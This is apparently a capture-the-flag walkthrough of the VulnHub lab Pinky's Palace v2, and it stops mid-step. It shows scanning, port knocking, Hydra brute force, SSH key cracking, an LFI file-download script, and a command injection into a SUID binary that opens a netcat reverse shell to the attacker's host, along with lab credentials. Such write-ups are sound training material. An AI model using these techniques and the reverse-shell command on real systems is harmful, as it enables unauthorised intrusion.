# Pinky's Palace: v2

Available on VulnHub:
https://www.vulnhub.com/entry/pinkys-palace-v2,229/

With thanks to Pink_Panther!

## Identify the target server IP address using Nmap

```
root@kali:~/Desktop# nmap -sP -PA21,22,25,3389 192.168.126.1/24
---SNIP---
MAC Address: 00:50:56:F3:96:7E (VMware)
Nmap scan report for 192.168.126.131
Host is up (0.00022s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds
```

Our target is 192.168.126.131

## Kick things off with Vanquish to automate our enumeration process in the background.
https://github.com/frizb/Vanquish

```
root@kali:~/Documents# cd Vanquish/
root@kali:~/Documents/Vanquish# echo 192.168.126.131 >> pinky.txt
root@kali:~/Documents/Vanquish# python Vanquish2.py -hostFile pinky.txt -verbose -logging
                  )             (   (       )  
         (     ( /(   (         )\ ))\ ) ( /(  
 (   (   )\    )\())( )\     ( (()/(()/( )\()) 
 )\  )((((_)( ((_)\ )((_)    )\ /(_))(_)|(_)\  
((_)((_)\ _ )\ _((_|(_)_  _ ((_|_))(_))  _((_) 
\ \ / /(_)_\(_) \| |/ _ \| | | |_ _/ __|| || | 
 \ V /  / _ \ | .` | (_) | |_| || |\__ \| __ | 
  \_/  /_/ \_\|_|\_|\__\_\\___/|___|___/|_||_| 
Get to shell.
Vanquish Version: 0.29 Updated: March 18, 2018

Configuration file: config.ini
Attack plan file:   attackplan.ini
Output Path:        ./pinky
Host File:          pinky.txt
---SNIP---
```

With Vanquish running in the background, I begin to review the website content manually while collecting the HTTP requests and responses through BurpSuite.

## Host file shenanigans
The website looks quite broken at first and I notice that it references a host named pinkydb, so I use VI to add that to my /etc/hosts file.

```
root@kali:/etc# cat hosts
127.0.0.1	localhost
127.0.1.1	kali
192.168.126.131 pinkydb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## WPScan
After loading the page with pinkydb loaded into my hosts file I can see we are dealing with a wordpress site.
Vanquish has automaticlly performed a WPScan so I check for any findings in that file.

```
root@kali:~/Documents/Vanquish/pinky/192_168_126_131/http# cat HTTP_Wordpress_Scan_1_80.txt 
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.126.131/
[+] Started: Wed Mar  7 13:27:06 2018

[!] The WordPress 'http://192.168.126.131/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
[+] XML-RPC Interface available under: http://192.168.126.131/xmlrpc.php
[!] Includes directory has directory listing enabled: http://192.168.126.131/wp-includes/
---SNIP---
[+] WordPress version 4.9.4 

[+] WordPress theme in use: twentyseventeen - v1.4
---SNIP---
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+

---SNIP---
```

Looks like we have a username: pinky1337
WordPress is running a very recent version and does not appear to be running any vulnerable plugins according to WPScan.

## Nmap TCP Scan All Ports Results
Time to take a quick look at the other ports open on this server, Vanquish has now finished it's scanning so I will check the NMAP scan results.

```
root@kali:~/Documents/Vanquish/pinky/192_168_126_131/always# cat Nmap_All_TCP_0.txt

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 13:27 PST
Nmap scan report for 192.168.126.131
Host is up (0.00030s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
```

From the Nmap results we are able to see 3 ports that have been filtered by a firewall:
4655, 7654, 31337

## Gobuster and Nikto 

Vanquish ran gobuster using the Dirb Common.txt and Dirb Big.txt directory lists.

*Nikto:*
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ OSVDB-3092: /secret/: This might be interesting...
```

*Gobuster:*
```
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.126.131:80/
[+] Threads      : 5
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 200,204,500
[+] Auth User    : username
[+] Follow Redir : true
[+] Expanded     : true
=====================================================
http://192.168.126.131:80/secret (Status: 200)
http://192.168.126.131:80/wordpress (Status: 200)
http://192.168.126.131:80/wp-content (Status: 200)
http://192.168.126.131:80/wp-includes (Status: 200)
http://192.168.126.131:80/wp-admin (Status: 200)
=====================================================
```

Looks like we have a wordpress admin access area and what appears to be an entirely separate wordpress instance that has not yet been fully configured in the /wordpress path.
The wordpress path is allowing me to setup a new instance of a wordpress site, but only if I am able to provide Database Credentials.

## Tell me a secret

The most interesting finding was the secret folder path that allowed the viewing of a file called bambam.txt.
http://192.168.126.131/secret/bambam.txt
```
8890
7000
666

pinkydb
```

With the wordpress username and secret content in hand, I converted the numbers into thier Ascii character equivalents and added them to the password list already created by vanquish (using CEWL and other sources).

I attempted to brute force my way into the Wordpress login page that I found and the wp setup page I had found.

```
hydra -l pinky1337 -P passwordlist.txt 192.168.126.131 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```


```
hydra -L users.txt -P passwordlist.txt 192.168.126.131 -V http-form-post '/wordpress/wp-admin/setup-config.php?step=2:dbname=database&uname=^USER^&pwd=^PASS^&dbhost=localhost&prefix=wp_&language=&submit=Submit:Error establishing a database connection'
```

The brute force apporach failed to yield any results.

## Knock Knock Knock...

After revisting bambam.txt again, I realized that these numbers are likely part of a port knock sequence to allow certian ports that are currently blocked to open up.  "Bam Bam" is of course the sound that someone makes when knocking on a door.

Port Knocking with Nmap
```
for x in 8890 7000 666; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
```

Check results:
```
root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 17:48 PST
Nmap scan report for 192.168.225.130
Host is up (0.00052s latency).

PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)
```

Hmmm still filtered.
I then proceeded to try running the numbers multiple times and in different combinations until this combination finally resulted in open ports:

```
for x in 7000 666 8890; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
```

```
root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 18:02 PST
Nmap scan report for 192.168.225.130
Host is up (0.00052s latency).

PORT      STATE SERVICE
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

## Open Sesame
Nmap was used to perform some port identification on the newly opened ports.

```
root@kali:~# nmap -sS -A -p80,4655,7654,31337 192.168.225.130
---SNIP---
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (EdDSA)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
---SNIP---
```

We now have a webserver (Nginx), an SSH port and what appears to be a console or shell.

Upon further investigation, the new webserver really wants you to use pinkydb rather than the ip address in order to access it. Otherwise, we end up getting a 403: forbidden message.

```
root@kali:/etc# wget http://192.168.225.130:7654
--2018-03-07 18:35:40--  http://192.168.225.130:7654/
Connecting to 192.168.225.130:7654... connected.
HTTP request sent, awaiting response... 403 Forbidden
2018-03-07 18:35:40 ERROR 403: Forbidden.

root@kali:/etc# wget http://pinkydb:7654
--2018-03-07 18:35:51--  http://pinkydb:7654/
Resolving pinkydb (pinkydb)... 192.168.225.130
Connecting to pinkydb (pinkydb)|192.168.225.130|:7654... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                  [ <=>                          ]     134  --.-KB/s    in 0s      

2018-03-07 18:35:51 (20.7 MB/s) - ‘index.html’ saved [134]
```

So I decided to run Vanquish again against the newly opened up server ports using the pinkdb name rather than the ip address in the background while I manually reviewed the new html server content.


```
root@kali:~/Documents/Vanquish# echo pinkydb >> pinkydb.txt
root@kali:~/Documents/Vanquish# python Vanquish2.py -hostFile pinkydb.txt -verbose -logging
 __      __     _   _  ____  _    _ _____  _____ _    _ 
 \ \    / /\   | \ | |/ __ \| |  | |_   _|/ ____| |  | |
  \ \  / /  \  |  \| | |  | | |  | | | | | (___ | |__| |
   \ \/ / /\ \ | . ` | |  | | |  | | | |  \___ \|  __  |
    \  / ____ \| |\  | |__| | |__| |_| |_ ____) | |  | |
     \/_/    \_\_| \_|\___\_\\____/|_____|_____/|_|  |_|
Set your Mertilizers on "deep fat fry".
Vanquish Version: 0.29 Updated: March 18, 2018

Configuration file: config.ini
Attack plan file:   attackplan.ini
Output Path:        ./pinkydb
Host File:          pinkydb.txt
---SNIP---
```

I quickly tried to perform a SQL authentication bypass on the login form with the username `' OR 1=1 --` but this had no effect.

## This looks like a job for Hydra

Using a short list of usernames I created from keywords and other clues on the website:
```
pinky1337
bambam
root
pinkydb
pinky
```
And a list of passwords that were generated by Vanquish by running CeWL 5.3 against the wordpress site:
```
root@kali:/# cewl http://192.168.225.130:80/ -m 6 -w ./pinkydb/192_168_225_130/http/HTTP_Cewl_Password_List_80PW.txt >> ./pinkydb/192_168_225_130/http/HTTP_Cewl_Password_List_80.txt
```

Then passing both of these lists into Hydra:
```
hydra -L users.txt -P passwordlist.txt pinkydb -s 7654 -V http-form-post '/login.php:user=^USER^&pass=^PASS^&submit=Login:Invalid Username or Password!'
```
The username and password for the login was uncovered: 
```
---SNIP---
[ATTEMPT] target pinkydb - login "pinky" - pass "programma" - 211 of 215 [child 1] (0/0)
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-03-07 18:55:25
```

After using the credentials found ( pinky:Passione ) an SSH RSA key and note was revealed:

notes.txt
```
- Stefano
- Intern Web developer
- Created RSA key for security for him to login
```

id_rsa
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BAC2C72352E75C879E2F26CC61A5B6E7

lyydl9wiTvUrlM7SXBKgMEP5tCK70Rce65i9sr7rxHmWm91uzd2GYBgSqGRIiPLP
hJdRi8HyRIz+1tf2FPoBvkjWl+WyRPpoVovXfEjL6lVvak6W1eNOuaGBjKT+8eaF
JC62d1ozuEM2eqpPcsVp8puwzP8Q77zYpZK9IOUo3xiupv4RrnBEGPYjaC1lLFRo
zlvUtoTnRQ0QCrjYuaL7EYQ1iBWoNc5ZMn1gqhBqQ/oE7/ff4eGhtG2i1LdscVf9
syk6ZBWFFA1wqlb2Vgv5Mn5BHx27GILo7o6yZzyxAuc02oJBnrg5Btlu/Tyx8ADV
ZR70DVA3q+/UoinxJCvH3zdKzOgzqHR9rdj5hiO6Np0Qzg//aWagrij5GqBpjCEt
aY2GxxXQQ8flNelYMvdcjHvZrjW8rKwU0nhyalu0+nFnLnHH6tMvAE6oqeIxIOO6
iJD7yUTrGfz0T7lRJQ7KQfeDQH+KGKgibLi60XWKQanRmrCiMLKnidLCjctyqsgh
lm5gPpqzw8CuPQ3EqPWIHYoDPak7Mk6SfpZaC+HQRauMbQqy5crP9YTtU1ZqRgdq
MsW7gnawwpTiE2cAR+AW9Cmy/n+cWoDvn+ceSrT1q81AjL1rKFSmwLWjKiKgJHER
Kv3zSMoBEzOGKAnQ5UOwOZPX+qQVGba+CJ2sZMdynd9HZrcMD29H4CLGO+VFggqs
3XUvpIcT4Arx9fVIk3hs6XeAnCOhj5f9Q2F4JnbqPdkQzBNJHCnrE8Rl4ymQl6lF
y/hvGWmDEtbockdNHGH9vF22kZuNmGKRROfYN5pmJYD9/L3RIvcC+UGDVojeUt/A
GDvjS8QhfNRwDUwTYHSUmIkz4fQt8g2bp3EixA/EH9IXV0HoBEtPzeaclqJJRBpW
WZK54Uj51hoqymDTfhS5HAwS6XaiN+SXyfXbZAqHMOTlegYNsGsYpGMXIB1oK+OL
lSwZimExQ042jVe4gxZ0ku3Qh/utmGUf3Rf7Ksng42tSt6uaVblXxO1JRPrI/ARt
5b7CjPBBZtIXUbtPF0/mw0q0tVZH/9BWjTvvAiMPlBvFwmujGKS+BA1krTz6YErY
ifoKTISVWsz7H1p4Xn1YD0sqfFtm2TSzsDj+x1Bpw4KXwquAoRfL61F6hVQKhyaV
8H6XaJCKuj8W2RhSe32pO7/MNYyCatZz5OtUt0XHYGf2EEOkihq8hecXpzHK0pnL
RcfhpffVDMjVV70Sl54WM9mqLHRzUWZZhAUehZkKrsou0LHoTrkWkYShrT1sc7uI
LoiicfuXpWegqXYKLSTY6YVn5iKov/eE3W3mxD/MIO4Fmi4VAcCp2EwXUlwQY8jI
839VYkApkA31uNNfp4GQw7ANqsopjN6bKIPpp8FVdCbgg7DlGZUuf/4cnXOc6gDA
K4+6vpcwC4AnJVsBfgjOmWajYple0zmDkQNkj+UptG8uC7VDwcd4FBfP+ISO1LID
MtLdf1/3qMbDQsqbdHXtZs2P84CvbJ2CPfHvTrG30JfXWuZoinMXtGwxY7x/IR0V
EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
-----END RSA PRIVATE KEY-----
```

Clearly these need to be used on the SSH port that was opened (Port# 4655).

## SSH with Stefano the Intern Web developer

Okay, time to set the permissions correctly for id_rsa and try it against the server.

```
root@kali:~/Documents/Vanquish/pinkydb# chmod 600 id_rsa
root@kali:~/Documents/Vanquish/pinkydb# ssh -i id_rsa Stefano@192.168.225.130 -p 4655
The authenticity of host '[192.168.225.130]:4655 ([192.168.225.130]:4655)' can't be established.
ECDSA key fingerprint is SHA256:u986iF153Xa6BbFapGcWhsyzav6u/iFhjUwFkG3+zTk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.225.130]:4655' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

Looks like the RSA key is encrypyted and we need a passphrase in order to use it.
This should have been apparent based on the Encrypted reference within the id_rsa key file:
```
Proc-Type: 4,ENCRYPTED
```

The go to tool for cracking an key passphrase is John the ripper:

```
root@kali:~/Documents/Vanquish/pinkydb# ssh2john id_rsa > shadow
root@kali:~/Documents/Vanquish/pinkydb# cat /usr/share/wordlists/rockyou.txt | john --pipe --rules shadow
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/32])
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
secretz101       (id_rsa)
1g 0:00:00:51  0.01959g/s 541516p/s 541516c/s 541516C/s secretz101
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The passphrase for the id_rsa private key file is `secretz101`

```
root@kali:~/Documents/Vanquish/pinkydb# ssh -i id_rsa Stefano@192.168.225.130 -p 4655
Enter passphrase for key 'id_rsa': 
Stefano@192.168.225.130's password: 
Permission denied, please try again.
```

Adding -v to ssh to get more details on what is happening.

```
root@kali:~/Documents/Vanquish/pinkydb# ssh -v -i id_rsa Stefano@192.168.225.130 -p 4655
OpenSSH_7.3p1 Debian-1, OpenSSL 1.0.2h  3 May 2016
debug1: Reading configuration data /root/.ssh/config
debug1: Reading configuration data /etc/ssh/ssh_config
---SNIP---
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: id_rsa
Enter passphrase for key 'id_rsa': 
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: password
Stefano@192.168.225.130's password: 
```

Pinkydb appears to want BOTH an public key and a password??!!?!?!?!?!??!

After some head scratching and Googling around I remembered that unix usernames are case sensitive so I tried `stefano` rather than `Stefano` and it worked! 

```
root@kali:~/Documents/Vanquish/pinkydb# ssh -v -i id_rsa stefano@pinkydb -p 4655 
---SNIP---
debug1: Trying private key: id_rsa
Enter passphrase for key 'id_rsa': 
---SNIP---
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ 
```

## I'm IN! [Keanu Reeves voice] - Enumerating stefano's SSH access

Lets see what stefano is all about
```
stefano@Pinkys-Palace:~$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)
stefano@Pinkys-Palace:~$ ls -la
total 32
drwxr-xr-x 4 stefano stefano 4096 Mar 17 21:27 .
drwxr-xr-x 5 root    root    4096 Mar 17 15:20 ..
-rw------- 1 stefano stefano  273 Mar 17 21:27 .bash_history
-rw-r--r-- 1 stefano stefano  220 May 15  2017 .bash_logout
-rw-r--r-- 1 stefano stefano 3526 May 15  2017 .bashrc
-rw-r--r-- 1 stefano stefano  675 May 15  2017 .profile
drwx------ 2 stefano stefano 4096 Mar 17 04:01 .ssh
drwxr-xr-x 2 stefano stefano 4096 Mar 17 04:01 tools
stefano@Pinkys-Palace:~$ 
```

Looks like stefano has some interesting bash_history
```
stefano@Pinkys-Palace:~$ cat .bash_history 
ls
cd tools/
lsd
ls
cd /usr/local/bin
ls
ls -al
cat backup.sh 
cd /home
ls -al
cd pinky/
cd demon/
cd /daemon/
cd /root
gdb
su
cd t
cd
cd tools/
ls -al
cat qsub
strings qsub 
./qsub 
./qsub Testing./qsub 
env
./qsub Testingenv
su
cleart
env
./qsub Test!
su
ls -al
su pinky
```

And we have a tools folder with a `note.txt` file and the qsub program that was referenced in the bash_history.
```
stefano@Pinkys-Palace:~$ cd tools
stefano@Pinkys-Palace:~/tools$ ls -la
total 28
drwxr-xr-x 2 stefano stefano   4096 Mar 17 04:01 .
drwxr-xr-x 4 stefano stefano   4096 Mar 17 21:27 ..
-rw-r--r-- 1 stefano stefano     65 Mar 16 04:28 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16 04:40 qsub
stefano@Pinkys-Palace:~/tools$ cat note.txt 
Pinky made me this program so I can easily send messages to him.
stefano@Pinkys-Palace:~/tools$ 
```

The bash_history also references a backup.sh file which we do not have permission to access or execute.
```
stefano@Pinkys-Palace:~/tools$ cd /usr/local/bin
stefano@Pinkys-Palace:/usr/local/bin$ ls
backup.sh
stefano@Pinkys-Palace:/usr/local/bin$ cat backup.sh 
cat: backup.sh: Permission denied
stefano@Pinkys-Palace:/usr/local/bin$ ls -la
total 12
drwxrwsr-x  2 root  staff 4096 Mar 17 16:31 .
drwxrwsr-x 10 root  staff 4096 Mar 17 04:24 ..
-rwxrwx---  1 demon pinky  113 Mar 17 21:24 backup.sh
stefano@Pinkys-Palace:/usr/local/bin$ 
```

Viewing the /etc/passwd file reveals that we are not the only users on this server.

```
stefano@Pinkys-Palace:/usr/local/bin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
---SNIP---
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
```
Pinks-Palace users include:
1. root
2. pinky
3. demon
4. stefano

After exploring the Apache folder I was able to find the Wordpress MySQL database credentials:
```
cd /var/www/html/apache
cat wp-config.php
---SNIP---
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'pwp_db');

/** MySQL database username */
define('DB_USER', 'pinkywp');

/** MySQL database password */
define('DB_PASSWORD', 'pinkydbpass_wp');

/** MySQL hostname */
define('DB_HOST', 'localhost');
---SNIP---
```

After exploring the nginx folder I was able to find the login application's credentials:
```
cd /var/www/html/nginx/pinkydb/html
cat config.php 
<?php
	define('DB_HOST', 'localhost');
	define('DB_USER', 'secretpinkdbuser');
	define('DB_PASS', 'pinkyssecretdbpass');
	define('DB_NAME', 'secretsdb');
	$conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME);
?>
```

Using the database credentials we are able to login to query and enumerate the local MySQL databases:
```
stefano@Pinkys-Palace:/var/www/html/nginx/pinkydb$ mysql -u secretpinkdbuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 30799
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| secretsdb          |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use secretsdb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [secretsdb]> show tables;
+---------------------+
| Tables_in_secretsdb |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

MariaDB [secretsdb]> select * from users;
+------+----------+----------------------------------+
| id   | username | password                         |
+------+----------+----------------------------------+
|    1 | pinky    | e09d0a6ab74963a7ad389a8ae5a79aaa |
+------+----------+----------------------------------+
1 row in set (0.00 sec)
```

There is a local file inclusion (LFI) vulnerability in the pagegap.php file
```
stefano@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ cat pageegap.php 
<?php
	include($_GET['1337']);
?>
```

This could allow a pivot to www-data user. The www-data group can view the `qsub` file that is owned by pinky.

## Welcome to Question Submit! (qsub)

When we run the `qsub` binary in the tools folder, we are prompted for a password.
```
stefano@Pinkys-Palace://home/stefano/tools$ ./qsub
./qsub <Message>
stefano@Pinkys-Palace://home/stefano/tools$ ./qsub HELLO FROM Q SUB!
[+] Input Password: password
[!] Incorrect Password!
```

Attempts to trigger a buffer overflow with the password entry input trigger a different response.
```
stefano@Pinkys-Palace://home/stefano/tools$ ./qsub Hello!
[+] Input Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bad hacker! Go away!
```

The PHP Local file include (LFI) vulnerability discovered earlier can allow us to create a shell.  I am mostly interested in reverse engineering the `qsub` file so I created a php include script to simply download that file so I could work on it.

```
stefano@Pinkys-Palace://home/stefano/tools$ cat <<EOF >>/tmp/getfile.php
> <?php
> \$filepath = '../../../../../../../../../home/stefano/tools/qsub';
> \$filename = 'qsub';
> 
> if (file_exists(\$filepath)) {
>     header('Content-Description: File Transfer');
>     header('Content-Type: application/x-download');
>     header('Content-Disposition: attachment; filename="'.basename(\$filename).'"');
>     header('Content-Transfer-Encoding: binary');
>     header('Expires: 0');
>     header('Cache-Control: must-revalidate');
>     header('Pragma: public');
>     header('Content-Length: ' . filesize(\$filepath));
>     readfile(\$filepath);
>     exit;
> }
> else
> {
>     echo "file not found ".\$filepath;
> }
> ?>
> EOF
```

From Firefox I downloaded qsub by going to the following URL:
```
http://pinkydb:7654/pageegap.php?1337=../../../../../../../tmp/getfile.php
```

Running strings against qsub provides some information but no obvious passwords are visible.
```
root@kali:~/Downloads# strings qsub
---SNIP---
puts
strlen
send
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
---SNIP---
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
%s <Message>
TERM
[+] Input Password: 
Bad hacker! Go away!
[+] Welcome to Question Submit!
[!] Incorrect Password!
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
---SNIP---
```

Running qsub using ltrace (on my 64bit Kali Linux virtual machine) revealed that the password is taken from the `TERM` environmental variable and is `xterm-256color`.
```
root@kali:~/Desktop# ltrace ./qsub test
getenv("TERM")                                   = "xterm-256color"
printf("[+] Input Password: ")                   = 20
__isoc99_scanf(0x55a6f5d15cb5, 0x7ffc3d9d8160, 0x7f66d45ca760, 0xfbad2a84[+] Input Password: test2
) = 1
strlen("test2")                                  = 5
strcmp("test2", "xterm-256color")                = -4
puts("[!] Incorrect Password!"[!] Incorrect Password!
)                  = 24
exit(0 <no return ...>
+++ exited (status 0) +++
```

Now to send a message to pinky.

```
stefano@Pinkys-Palace://home/stefano/tools$ ./qsub Hello from stefano!
[+] Input Password: xterm-256color
[+] Welcome to Question Submit!
```

## Qsub Command Injection as Pinky

Based on the `strings` contents of `qsub` and it's use of `/bin/echo`, it appears we can inject arbitrary bash commands in our message to pinky.
```
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
```

By substituting the `%s` with `&& nc -nv 192.168.225.129 4444 -e /bin/bash`, a reverse shell can be created into Pinky's account.
```
/bin/echo Test && nc -nv 192.168.225.129 4444 -e /bin/bash >> /home/pinky/messages/stefano_msg.txt
```

Setup the netcat listner on my Kali box:
```
root@kali:~/Downloads# nc -nlvp 4444
listening on [any] 4444 ...
```

Trigger the reverse shell using qsub and wrap the single quotes otherwise the `&&` is going to create problems. 
```
stefano@Pinkys-Palace://home/stefano/tools$ ./qsub 'Test && nc -nv 192.168.225.129 4444 -e /bin/bash'
[+] Input Password: xterm-256color
Test
(UNKNOWN) [192.168.225.129] 4444 (?) open
```

And we have a reverse shell for the user pinky!
```
connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 57460
id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
```

## Pinky user access Enumeration

First things first, need to fix this shell and take a look at the home directory for pinky.
```
python -c "import pty; pty.spawn('/bin/bash')"
pinky@Pinkys-Palace://home/stefano/tools$ cd /home/pinky
pinky@Pinkys-Palace://home/pinky$ ls -la
drwxr-x--- 3 pinky pinky    4096 Apr 22 12:12 .
drwxr-xr-x 5 root  root     4096 Mar 17 15:20 ..
-rw------- 1 pinky pinky      66 Mar 17 21:27 .bash_history
-rw-r--r-- 1 pinky pinky     220 Mar 17 04:27 .bash_logout
-rw-r--r-- 1 pinky pinky    3526 Mar 17 04:27 .bashrc
drwxr-xr-x 2 pinky pinky    4096 Mar 17 04:01 messages
-rw-r--r-- 1 pinky pinky     675 Mar 17 04:27 .profile
pinky@Pinkys-Palace:/home/pinky$ cd messages
pinky@Pinkys-Palace:/home/pinky/messages$ ls
stefano_msg.txt
pinky@Pinkys-Palace:/home/pinky/messages$ cat stefano_msg.txt
Hi it's Stefano!
Testing!
Test!
Hello
Test
Test
pinky@Pinkys-Palace:/home/pinky/messages$ 
```

During my enumeration of stefano, a file called `backup.sh` was uncovered that could be run, written to and executed by users in the pinky group.
```
pinky@Pinkys-Palace://home/pinky$ cd /usr/local/bin
pinky@Pinkys-Palace:/usr/local/bin$ ls -la
drwxrwsr-x  2 root  staff 4096 Mar 17 16:31 .
drwxrwsr-x 10 root  staff 4096 Mar 17 04:24 ..
-rwxrwx---  1 demon pinky  113 Mar 17 21:24 backup.sh
pinky@Pinkys-Palace:/usr/local/bin$ cat backup.sh
cat: backup.sh: Permission denied
pinky@Pinkys-Palace:/usr/local/bin$ id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
```
However, the current user is still in stefano's group.
Time to change the user group to pinky.
```
pinky@Pinkys-Palace:/usr/local/bin$ newgrp pinky
pinky@Pinkys-Palace:/usr/local/bin$ id
